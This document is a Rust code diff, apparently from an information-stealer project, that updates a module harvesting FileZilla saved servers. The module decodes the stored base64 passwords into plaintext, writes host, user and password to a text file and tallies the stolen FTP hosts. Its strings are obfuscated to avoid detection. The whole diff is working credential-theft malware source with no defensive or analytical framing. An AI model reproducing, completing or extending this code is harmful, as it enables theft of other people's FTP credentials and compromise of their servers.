@@ -3,6 +3,7 @@ use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
 use collector::atomic::AtomicCollector;
+use collector::{Collector, Software};
 use obfstr::obfstr as s;
 use tasks::Task;
 use utils::base64::base64_decode;
@@ -13,8 +14,7 @@ use windows::Data::Xml::Dom::XmlDocument;
 pub(super) struct FileZillaTask;
 
 impl Task for FileZillaTask {
-    // TODO: Impl collector
-    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
+    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
         let servers = collect_servers();
 
         if servers.is_empty() {
@@ -29,7 +29,7 @@ impl Task for FileZillaTask {
             }
         }
 
-        let servers = deduped.iter().map(|server| {
+        let servers: Vec<String> = deduped.iter().map(|server| {
             let password_decoded = base64_decode(server.password.as_bytes())
                 .map(|decoded| String::from_utf8_lossy(&decoded).to_string());
 
@@ -45,10 +45,12 @@ impl Task for FileZillaTask {
                 server.user,
                 password_str
             )
-        }).collect::<Vec<_>>().join("\n\n");
+        }).collect();
 
-        let output = parent / s!("FileZilla.txt");
-        let _ = servers.write_to(&output);
+        collector.software().increase_ftp_hosts_by(servers.len());
+
+        let servers = servers.join("\n\n");
+        let _ = servers.write_to(parent / s!("FileZilla.txt"));
     }
 }
 
